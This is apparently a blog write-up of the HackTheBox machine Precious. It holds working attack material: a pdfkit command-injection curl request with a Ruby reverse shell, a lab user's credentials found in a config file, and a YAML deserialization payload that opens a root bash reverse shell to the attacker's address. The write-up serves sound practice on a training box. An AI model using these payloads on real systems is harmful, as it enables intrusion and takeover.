@@ -1,0 +1,764 @@
+<!DOCTYPE html>
+<html lang="en-us" dir="ltr">
+    <head><meta charset='utf-8'>
+<meta name='viewport' content='width=device-width, initial-scale=1'><meta name='description' content='I return to HTB'><title>Precious</title>
+
+<link rel='canonical' href='https://www.phireheavyindustries.com%22/p/precious/'>
+
+<link rel="stylesheet" href="/scss/style.min.d9e0562edde3d2bdf9d3d81365095a29d062ddaaa5d671f22168e57dfdb18b4f.css"><meta property='og:title' content='Precious'>
+<meta property='og:description' content='I return to HTB'>
+<meta property='og:url' content='https://www.phireheavyindustries.com&#34;/p/precious/'>
+<meta property='og:site_name' content='phire heavy industries'>
+<meta property='og:type' content='article'><meta property='article:section' content='Post' /><meta property='article:tag' content='flag' /><meta property='article:tag' content='root' /><meta property='article:tag' content='writeup' /><meta property='article:tag' content='tryhackme' /><meta property='article:tag' content='easy' /><meta property='article:published_time' content='2023-01-07T00:00:00&#43;00:00'/><meta property='article:modified_time' content='2023-01-07T00:00:00&#43;00:00'/>
+<meta name="twitter:title" content="Precious">
+<meta name="twitter:description" content="I return to HTB">
+    </head>
+    <body class="
+    article-page
+    ">
+    <script>
+        (function() {
+            const colorSchemeKey = 'StackColorScheme';
+            if(!localStorage.getItem(colorSchemeKey)){
+                localStorage.setItem(colorSchemeKey, "auto");
+            }
+        })();
+    </script><script>
+    (function() {
+        const colorSchemeKey = 'StackColorScheme';
+        const colorSchemeItem = localStorage.getItem(colorSchemeKey);
+        const supportDarkMode = window.matchMedia('(prefers-color-scheme: dark)').matches === true;
+
+        if (colorSchemeItem == 'dark' || colorSchemeItem === 'auto' && supportDarkMode) {
+            
+
+            document.documentElement.dataset.scheme = 'dark';
+        } else {
+            document.documentElement.dataset.scheme = 'light';
+        }
+    })();
+</script>
+<div class="container main-container flex on-phone--column extended"><aside class="sidebar left-sidebar sticky ">
+    <button class="hamburger hamburger--spin" type="button" id="toggle-menu" aria-label="Toggle Menu">
+        <span class="hamburger-box">
+            <span class="hamburger-inner"></span>
+        </span>
+    </button>
+
+    <header>
+        
+            
+            <figure class="site-avatar">
+                <a href="/">
+                
+                    
+                    
+                    
+                        
+                        <img src="/img/10_huaf8374600aea688da2b9275ce86cd12a_155910_300x0_resize_box_3.png" width="300"
+                            height="300" class="site-logo" loading="lazy" alt="Avatar">
+                    
+                
+                </a>
+                
+            </figure>
+            
+        
+        
+        <div class="site-meta">
+            <h1 class="site-name"><a href="/">phire heavy industries</a></h1>
+            <h2 class="site-description">i never know what to write on these things</h2>
+        </div>
+    </header><ol class="social-menu">
+            
+                <li>
+                    <a 
+                        href='https://www.facebook.com/phireheavyindustries'
+                        target="_blank"
+                        title="facebook"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-infinity" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M9.828 9.172a4 4 0 1 0 0 5.656 a10 10 0 0 0 2.172 -2.828a10 10 0 0 1 2.172 -2.828 a4 4 0 1 1 0 5.656a10 10 0 0 1 -2.172 -2.828a10 10 0 0 0 -2.172 -2.828" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://github.com/phireheavy'
+                        target="_blank"
+                        title="GitHub"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-github" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M9 19c-4.3 1.4 -4.3 -2.5 -6 -3m12 5v-3.5c0 -1 .1 -1.4 -.5 -2c2.8 -.3 5.5 -1.4 5.5 -6a4.6 4.6 0 0 0 -1.3 -3.2a4.2 4.2 0 0 0 -.1 -3.2s-1.1 -.3 -3.5 1.3a12.3 12.3 0 0 0 -6.2 0c-2.4 -1.6 -3.5 -1.3 -3.5 -1.3a4.2 4.2 0 0 0 -.1 3.2a4.6 4.6 0 0 0 -1.3 3.2c0 4.6 2.7 5.7 5.5 6c-.6 .6 -.6 1.2 -.5 2v3.5" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+                <li>
+                    <a 
+                        href='https://twitter.com/phireheavy'
+                        target="_blank"
+                        title="Twitter"
+                    >
+                        
+                        
+                            <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-brand-twitter" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z" fill="none"/>
+  <path d="M22 4.01c-1 .49 -1.98 .689 -3 .99c-1.121 -1.265 -2.783 -1.335 -4.38 -.737s-2.643 2.06 -2.62 3.737v1c-3.245 .083 -6.135 -1.395 -8 -4c0 0 -4.182 7.433 4 11c-1.872 1.247 -3.739 2.088 -6 2c3.308 1.803 6.913 2.423 10.034 1.517c3.58 -1.04 6.522 -3.723 7.651 -7.742a13.84 13.84 0 0 0 .497 -3.753c-.002 -.249 1.51 -2.772 1.818 -4.013z" />
+</svg>
+
+
+
+                        
+                    </a>
+                </li>
+            
+        </ol><ol class="menu" id="main-menu">
+        
+        
+        
+
+        <li >
+            <a href='/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-home" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <polyline points="5 12 3 12 12 3 21 12 19 12" />
+  <path d="M5 12v7a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-7" />
+  <path d="M9 21v-6a2 2 0 0 1 2 -2h2a2 2 0 0 1 2 2v6" />
+</svg>
+
+
+
+                
+                <span>Home</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/about/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-user" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="7" r="4" />
+  <path d="M6 21v-2a4 4 0 0 1 4 -4h4a4 4 0 0 1 4 4v2" />
+</svg>
+
+
+
+                
+                <span>About me</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/archives/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-archive" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <rect x="3" y="4" width="18" height="4" rx="2" />
+  <path d="M5 8v10a2 2 0 0 0 2 2h10a2 2 0 0 0 2 -2v-10" />
+  <line x1="10" y1="12" x2="14" y2="12" />
+</svg>
+
+
+
+                
+                <span>Archives</span>
+            </a>
+        </li>
+        
+        
+
+        <li >
+            <a href='/search/' >
+                
+                
+                
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-search" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="10" cy="10" r="7" />
+  <line x1="21" y1="21" x2="15" y2="15" />
+</svg>
+
+
+
+                
+                <span>Search</span>
+            </a>
+        </li>
+        
+
+        <div class="menu-bottom-section">
+            
+            
+                <li id="dark-mode-toggle">
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-left" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="8" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-toggle-right" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="16" cy="12" r="2" />
+  <rect x="2" y="6" width="20" height="12" rx="6" />
+</svg>
+
+
+
+                    <span>Dark Mode</span>
+                </li>
+            
+        </div>
+    </ol>
+</aside>
+<main class="main full-width">
+    <article class="main-article">
+    <header class="article-header">
+
+    <div class="article-details">
+    
+    <header class="article-category">
+        
+            <a href="/categories/hackthebox/" >
+                hackthebox
+            </a>
+        
+            <a href="/categories/writeup/" >
+                writeup
+            </a>
+        
+    </header>
+    
+
+    <div class="article-title-wrapper">
+        <h2 class="article-title">
+            <a href="/p/precious/">Precious</a>
+        </h2>
+    
+        
+        <h3 class="article-subtitle">
+            I return to HTB
+        </h3>
+        
+    </div>
+
+    
+    <footer class="article-time">
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-calendar-time" width="56" height="56" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <path d="M11.795 21h-6.795a2 2 0 0 1 -2 -2v-12a2 2 0 0 1 2 -2h12a2 2 0 0 1 2 2v4" />
+  <circle cx="18" cy="18" r="4" />
+  <path d="M15 3v4" />
+  <path d="M7 3v4" />
+  <path d="M3 11h16" />
+  <path d="M18 16.496v1.504l1 1" />
+</svg>
+                <time class="article-time--published">Jan 07, 2023</time>
+            </div>
+        
+
+        
+            <div>
+                <svg xmlns="http://www.w3.org/2000/svg" class="icon icon-tabler icon-tabler-clock" width="24" height="24" viewBox="0 0 24 24" stroke-width="2" stroke="currentColor" fill="none" stroke-linecap="round" stroke-linejoin="round">
+  <path stroke="none" d="M0 0h24v24H0z"/>
+  <circle cx="12" cy="12" r="9" />
+  <polyline points="12 7 12 12 15 15" />
+</svg>
+
+
+
+                <time class="article-time--reading">
+                    5 minute read
+                </time>
+            </div>
+        
+    </footer>
+    
+
+    
+</div>
+</header>
+
+    <section class="article-content">
+    
+    
+    <p>Box URL: <a class="link" href="https://app.hackthebox.com/machines/Precious"  target="_blank" rel="noopener"
+    >https://app.hackthebox.com/machines/Precious</a>
+Host: precious.htb
+IP: 10.10.11.189
+Status: Done
+Tags: easy, hackthebox, writeup</p>
+<p>I start with the usual nmap</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="c1"># Nmap 7.93 scan initiated Sat Jan  7 20:40:32 2023 as: nmap -sC -sV -Pn -on 10.10.11.189</span>
+</span></span><span class="line"><span class="cl">Nmap scan report <span class="k">for</span> 10.10.11.189
+</span></span><span class="line"><span class="cl">Host is up <span class="o">(</span>0.044s latency<span class="o">)</span>.
+</span></span><span class="line"><span class="cl">Not shown: <span class="m">998</span> closed tcp ports <span class="o">(</span>conn-refused<span class="o">)</span>
+</span></span><span class="line"><span class="cl">PORT   STATE SERVICE VERSION
+</span></span><span class="line"><span class="cl">22/tcp open  ssh     OpenSSH 8.4p1 Debian 5+deb11u1 <span class="o">(</span>protocol 2.0<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span> ssh-hostkey: 
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">3072</span> 845e13a8e31e20661d235550f63047d2 <span class="o">(</span>RSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>   <span class="m">256</span> a2ef7b9665ce4161c467ee4e96c7c892 <span class="o">(</span>ECDSA<span class="o">)</span>
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_  <span class="m">256</span> 33053dcd7ab798458239e7ae3c91a658 <span class="o">(</span>ED25519<span class="o">)</span>
+</span></span><span class="line"><span class="cl">80/tcp open  http    nginx 1.18.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-server-header: nginx/1.18.0
+</span></span><span class="line"><span class="cl"><span class="p">|</span>_http-title: Did not follow redirect to http://precious.htb/
+</span></span><span class="line"><span class="cl">Service Info: OS: Linux<span class="p">;</span> CPE: cpe:/o:linux:linux_kernel
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
+</span></span><span class="line"><span class="cl"><span class="c1"># Nmap done at Sat Jan  7 20:40:42 2023 -- 1 IP address (1 host up) scanned in 9.87 seconds</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Searching for subdirectories finds nothing. Let&rsquo;s also fire up Nikto.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">- Nikto v2.1.6
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Target IP:          10.10.11.189
+</span></span><span class="line"><span class="cl">+ Target Hostname:    precious.htb
+</span></span><span class="line"><span class="cl">+ Target Port:        <span class="m">80</span>
+</span></span><span class="line"><span class="cl">+ Start Time:         2023-01-07 23:40:17 <span class="o">(</span>GMT0<span class="o">)</span>
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ Server: nginx/1.18.0 + Phusion Passenger<span class="o">(</span>R<span class="o">)</span> 6.0.15
+</span></span><span class="line"><span class="cl">+ Retrieved x-powered-by header: Phusion Passenger<span class="o">(</span>R<span class="o">)</span> 6.0.15
+</span></span><span class="line"><span class="cl">+ Uncommon header <span class="s1">&#39;x-runtime&#39;</span> found, with contents: Ruby
+</span></span><span class="line"><span class="cl">+ Uncommon header <span class="s1">&#39;x-cascade&#39;</span> found, with contents: pass
+</span></span><span class="line"><span class="cl">+ No CGI Directories found <span class="o">(</span>use <span class="s1">&#39;-C all&#39;</span> to force check all possible <span class="nb">dirs</span><span class="o">)</span>
+</span></span><span class="line"><span class="cl">+ Server banner has changed from <span class="s1">&#39;nginx/1.18.0 + Phusion Passenger(R) 6.0.15&#39;</span> to <span class="s1">&#39;nginx/1.18.0&#39;</span> which may suggest a WAF, load balancer or proxy is in place
+</span></span><span class="line"><span class="cl">+ <span class="m">7785</span> requests: <span class="m">0</span> error<span class="o">(</span>s<span class="o">)</span> and <span class="m">3</span> item<span class="o">(</span>s<span class="o">)</span> reported on remote host
+</span></span><span class="line"><span class="cl">+ End Time:           2023-01-07 23:47:05 <span class="o">(</span>GMT0<span class="o">)</span> <span class="o">(</span><span class="m">408</span> seconds<span class="o">)</span>
+</span></span><span class="line"><span class="cl">---------------------------------------------------------------------------
+</span></span><span class="line"><span class="cl">+ <span class="m">1</span> host<span class="o">(</span>s<span class="o">)</span> tested
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I can produce a PDF, setting up a local webserver with a simple html page. Checking the properties of the PDF as was suggested by some users on the HTB Board, i notice that pdfkit v0.8.6 is used. Checking the vulnerabilites, for this software there is one that seems usable.</p>
+<p>The following <a class="link" href="https://www.ctfiot.com/84447.html"  target="_blank" rel="noopener"
+    >site</a> has an explanation on exploiting this vulnerability, this is done using a constructed payload with curl and getting a reverse shell. Using this method i can get a reverse shell and login with the user ruby.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">curl <span class="s1">&#39;http://precious.htb/&#39;</span> -X POST -H <span class="s1">&#39;User-Agent: Mozilla/5.0 (X11; Linux x86_64; rv:102.0) Gecko/20100101 Firefox/102.0&#39;</span> -H <span class="s1">&#39;Accept: text/html,application/xhtml+xml,application/xml;q=0.9,image/avif,image/webp,/;q=0.8&#39;</span> -H <span class="s1">&#39;Accept-Language: en-US,en;q=0.5&#39;</span> -H <span class="s1">&#39;Accept-Encoding: gzip, deflate&#39;</span> -H <span class="s1">&#39;Content-Type: application/x-www-form-urlencoded&#39;</span> -H <span class="s1">&#39;Origin: TARGET_URL&#39;</span> -H <span class="s1">&#39;Connection: keep-alive&#39;</span> -H <span class="s1">&#39;Referer: TARGET_URL&#39;</span> -H <span class="s1">&#39;Upgrade-Insecure-Requests: 1&#39;</span> --data-raw <span class="s1">&#39;url=http%3A%2F%2FLOCAL-IP%3A10.10.14.159:8000%2F%3Fname%3D%2520%60+ruby+-rsocket+-e%27spawn%28%22sh%22%2C%5B%3Ain%2C%3Aout%2C%3Aerr%5D%3D%3ETCPSocket.new%28%2210.10.14.159%22%2C9001%29%29%27%60&#39;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After getting a reverse shell i find two homefolders, one for a user ruby and another for a user henry. CDing into the henry folder, i can see that the user flag is there, but i cannot read it. I then look for files with ls -la and find nothing interesting. Backing out to the ruby folder there is a hidden folder with a config file inside. The contents of this file look like credentials to the henry user. Using these credentials to open a ssh session grants me the flag for the user.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl"><span class="nb">cd</span> ruby
+</span></span><span class="line"><span class="cl">ls -la
+</span></span><span class="line"><span class="cl">total <span class="m">28</span>
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> ruby ruby <span class="m">4096</span> Jan  <span class="m">8</span> 14:34 .
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">4</span> root root <span class="m">4096</span> Oct <span class="m">26</span> 08:28 ..
+</span></span><span class="line"><span class="cl">lrwxrwxrwx <span class="m">1</span> root root    <span class="m">9</span> Oct <span class="m">26</span> 07:53 .bash_history -&gt; /dev/null
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> ruby ruby  <span class="m">220</span> Mar <span class="m">27</span>  <span class="m">2022</span> .bash_logout
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> ruby ruby <span class="m">3526</span> Mar <span class="m">27</span>  <span class="m">2022</span> .bashrc
+</span></span><span class="line"><span class="cl">dr-xr-xr-x <span class="m">2</span> root ruby <span class="m">4096</span> Oct <span class="m">26</span> 08:28 .bundle
+</span></span><span class="line"><span class="cl">drwxr-xr-x <span class="m">3</span> ruby ruby <span class="m">4096</span> Jan  <span class="m">8</span> 14:34 .cache
+</span></span><span class="line"><span class="cl">-rw-r--r-- <span class="m">1</span> ruby ruby  <span class="m">807</span> Mar <span class="m">27</span>  <span class="m">2022</span> .profile
+</span></span><span class="line"><span class="cl">cat .bundle
+</span></span><span class="line"><span class="cl">cat: .bundle: Is a directory
+</span></span><span class="line"><span class="cl"><span class="nb">cd</span> .bundle
+</span></span><span class="line"><span class="cl">ls
+</span></span><span class="line"><span class="cl">config
+</span></span><span class="line"><span class="cl">cat config
+</span></span><span class="line"><span class="cl">---
+</span></span><span class="line"><span class="cl">BUNDLE_HTTPS://RUBYGEMS__ORG/: <span class="s2">&#34;henry:Q3c1AqGHtoI0aXAYFH&#34;</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>After getting a user shell, i run sudo -l to see what commands can this user run as root. There is only one command that seems to be a ruby script that updates dependencies.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span><span class="lnt">6
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">henry@precious:~$ sudo -l
+</span></span><span class="line"><span class="cl">Matching Defaults entries <span class="k">for</span> henry on precious:
+</span></span><span class="line"><span class="cl">    env_reset, mail_badpass, <span class="nv">secure_path</span><span class="o">=</span>/usr/local/sbin<span class="se">\:</span>/usr/local/bin<span class="se">\:</span>/usr/sbin<span class="se">\:</span>/usr/bin<span class="se">\:</span>/sbin<span class="se">\:</span>/bin
+</span></span><span class="line"><span class="cl">
+</span></span><span class="line"><span class="cl">User henry may run the following commands on precious:
+</span></span><span class="line"><span class="cl">    <span class="o">(</span>root<span class="o">)</span> NOPASSWD: /usr/bin/ruby /opt/update_dependencies.rb
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>I try to run commands in parallel, but that doesn’t work. Also, i notice that whatever folder i’m in, the command always returns the same error, stating that it cannot find a file.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt">1
+</span><span class="lnt">2
+</span><span class="lnt">3
+</span><span class="lnt">4
+</span><span class="lnt">5
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-bash" data-lang="bash"><span class="line"><span class="cl">henry@precious:~$ sudo ruby /opt/update_dependencies.rb 
+</span></span><span class="line"><span class="cl">Traceback <span class="o">(</span>most recent call last<span class="o">)</span>:
+</span></span><span class="line"><span class="cl">        2: from /opt/update_dependencies.rb:17:in <span class="sb">`</span>&lt;main&gt;<span class="s1">&#39;
+</span></span></span><span class="line"><span class="cl"><span class="s1">        1: from /opt/update_dependencies.rb:10:in `list_from_file&#39;</span>
+</span></span><span class="line"><span class="cl">/opt/update_dependencies.rb:10:in <span class="sb">`</span>read<span class="err">&#39;</span>: No such file or directory @ rb_sysopen - dependencies.yml <span class="o">(</span>Errno::ENOENT<span class="o">)</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>This leads me to believe that i need to create this .yml file. A quick google search leads to me a <a class="link" href="https://blog.stratumsecurity.com/2021/06/09/blind-remote-code-execution-through-yaml-deserialization/"  target="_blank" rel="noopener"
+    >vulnerability</a> about .yml deserialization and running code. Since this is run as root, i can try to get another reverse shell, this time as a root user. So i use the vulnerability as stated on the website, changing the code to open a shell. This works as intended, allowing me to login as root and get the root flag.</p>
+<div class="highlight"><div class="chroma">
+<table class="lntable"><tr><td class="lntd">
+<pre tabindex="0" class="chroma"><code><span class="lnt"> 1
+</span><span class="lnt"> 2
+</span><span class="lnt"> 3
+</span><span class="lnt"> 4
+</span><span class="lnt"> 5
+</span><span class="lnt"> 6
+</span><span class="lnt"> 7
+</span><span class="lnt"> 8
+</span><span class="lnt"> 9
+</span><span class="lnt">10
+</span><span class="lnt">11
+</span><span class="lnt">12
+</span><span class="lnt">13
+</span><span class="lnt">14
+</span><span class="lnt">15
+</span><span class="lnt">16
+</span><span class="lnt">17
+</span><span class="lnt">18
+</span><span class="lnt">19
+</span></code></pre></td>
+<td class="lntd">
+<pre tabindex="0" class="chroma"><code class="language-ruby" data-lang="ruby"><span class="line"><span class="cl"><span class="o">---</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="ss">object</span><span class="p">:</span><span class="no">Gem</span><span class="o">::</span><span class="no">Installer</span>
+</span></span><span class="line"><span class="cl">    <span class="ss">i</span><span class="p">:</span> <span class="n">x</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="ss">object</span><span class="p">:</span><span class="no">Gem</span><span class="o">::</span><span class="no">SpecFetcher</span>
+</span></span><span class="line"><span class="cl">    <span class="ss">i</span><span class="p">:</span> <span class="n">y</span>
+</span></span><span class="line"><span class="cl"><span class="o">-</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="ss">object</span><span class="p">:</span><span class="no">Gem</span><span class="o">::</span><span class="no">Requirement</span>
+</span></span><span class="line"><span class="cl">  <span class="ss">requirements</span><span class="p">:</span>
+</span></span><span class="line"><span class="cl">    <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="ss">object</span><span class="p">:</span><span class="no">Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span>
+</span></span><span class="line"><span class="cl">    <span class="ss">io</span><span class="p">:</span> <span class="o">&amp;</span><span class="mi">1</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="ss">object</span><span class="p">:</span><span class="no">Net</span><span class="o">::</span><span class="no">BufferedIO</span>
+</span></span><span class="line"><span class="cl">      <span class="ss">io</span><span class="p">:</span> <span class="o">&amp;</span><span class="mi">1</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="ss">object</span><span class="p">:</span><span class="no">Gem</span><span class="o">::</span><span class="no">Package</span><span class="o">::</span><span class="no">TarReader</span><span class="o">::</span><span class="no">Entry</span>
+</span></span><span class="line"><span class="cl">         <span class="ss">read</span><span class="p">:</span> <span class="mi">0</span>
+</span></span><span class="line"><span class="cl">         <span class="ss">header</span><span class="p">:</span> <span class="s2">&#34;abc&#34;</span>
+</span></span><span class="line"><span class="cl">      <span class="ss">debug_output</span><span class="p">:</span> <span class="o">&amp;</span><span class="mi">1</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="ss">object</span><span class="p">:</span><span class="no">Net</span><span class="o">::</span><span class="no">WriteAdapter</span>
+</span></span><span class="line"><span class="cl">         <span class="ss">socket</span><span class="p">:</span> <span class="o">&amp;</span><span class="mi">1</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="ss">object</span><span class="p">:</span><span class="no">Gem</span><span class="o">::</span><span class="no">RequestSet</span>
+</span></span><span class="line"><span class="cl">             <span class="ss">sets</span><span class="p">:</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="ss">object</span><span class="p">:</span><span class="no">Net</span><span class="o">::</span><span class="no">WriteAdapter</span>
+</span></span><span class="line"><span class="cl">                 <span class="ss">socket</span><span class="p">:</span> <span class="o">!</span><span class="n">ruby</span><span class="o">/</span><span class="n">module</span> <span class="s1">&#39;Kernel&#39;</span>
+</span></span><span class="line"><span class="cl">                 <span class="ss">method_id</span><span class="p">:</span> <span class="ss">:system</span>
+</span></span><span class="line"><span class="cl">             <span class="ss">git_set</span><span class="p">:</span> <span class="s2">&#34;bash -c &#39;bash -i &gt;&amp; /dev/tcp/10.10.14.159/9004 0&gt;&amp;1&#39;&#34;</span>
+</span></span><span class="line"><span class="cl">         <span class="ss">method_id</span><span class="p">:</span> <span class="ss">:resolve</span>
+</span></span></code></pre></td></tr></table>
+</div>
+</div><p>Easiest box by far.</p>
+
+</section>
+
+
+    <footer class="article-footer">
+    
+    <section class="article-tags">
+        
+            <a href="/tags/flag/">flag</a>
+        
+            <a href="/tags/root/">root</a>
+        
+            <a href="/tags/writeup/">writeup</a>
+        
+            <a href="/tags/tryhackme/">tryhackme</a>
+        
+            <a href="/tags/easy/">easy</a>
+        
+    </section>
+
+
+    </footer>
+
+
+    
+</article>
+
+    
+
+    
+
+<aside class="related-contents--wrapper">
+    <h2 class="section-title">Related contents</h2>
+    <div class="related-contents">
+        <div class="flex article-list--tile">
+            
+                
+<article class="">
+    <a href="/p/timelapse/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Timelapse</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/cat/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Cat</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/eternal-loop/">
+        
+        
+
+        <div class="article-details">
+            <h2 class="article-title">Eternal loop</h2>
+        </div>
+    </a>
+</article>
+            
+                
+<article class="">
+    <a href="/p/eternal-loop/">
+        
+        
+
+        <div class="article-details">
